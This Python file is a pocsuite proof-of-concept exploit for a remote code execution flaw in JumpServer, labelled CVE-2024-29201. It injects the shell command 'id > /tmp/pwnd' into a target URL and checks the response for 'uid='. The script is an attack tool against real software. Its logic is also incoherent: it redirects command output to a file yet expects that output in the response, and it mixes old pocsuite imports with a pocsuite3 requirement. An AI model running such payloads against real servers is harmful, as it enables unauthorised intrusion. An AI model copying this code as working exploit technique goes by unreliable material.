#!/usr/bin/env python
# coding: utf-8

from pocsuite.api.request import req
from pocsuite.api.poc import register, Output, POCBase
from pocsuite.thirdparty.guanxing import parse_ip_port, http_packet, make_verify_url

class JumpServerPOC(POCBase):
    vulID = 'CVE-2024-29201'
    cveID = 'CVE-2024-29201'
    cnvdID = ''
    cnnvdID = ''
    version = '1.0'
    author = '陆皓喆'  # 作者名称
    vulDate = '2024-05'  # 漏洞发现日期
    createDate = '2024-07-24'  # POC 创建日期
    updateDate = '2024-07-24'  # POC 更新日期
    name = 'JumpServer Remote Code Execution Vulnerability (CVE-2024-29201)'
    desc = '''
    This is a POC for the remote code execution vulnerability in JumpServer (CVE-2024-29201).
    It demonstrates how to exploit the vulnerability and verify the exploit result.
    '''
    solution = 'Upgrade to version v3.10.7 or later.'
    severity = 'Critical'
    vulType = 'Remote Code Execution'
    taskType = 'verify'
    references = ['https://blog.csdn.net/qq_43355651/article/details/137275412']
    appName = 'JumpServer'
    appVersion = 'V3.0.0 <= JumpServer <= V3.10.6'
    appPowerLink = 'https://www.jumpserver.org/'
    samples = ['']
    install_requires = ['pocsuite3']

    def _attack(self):
        return self._verify()

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        payload = "id > /tmp/pwnd"
        vul_url = make_verify_url(self.url, payload, mod=0)
        resp = req.get(vul_url, headers=headers, verify=False, allow_redirects=False, timeout=10)
        if resp.status_code == 200 and 'uid=' in resp.text:
            result['VerifyInfo'] = http_packet(resp)
            result['VerifyInfo']['URL'] = vul_url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output

register(JumpServerPOC)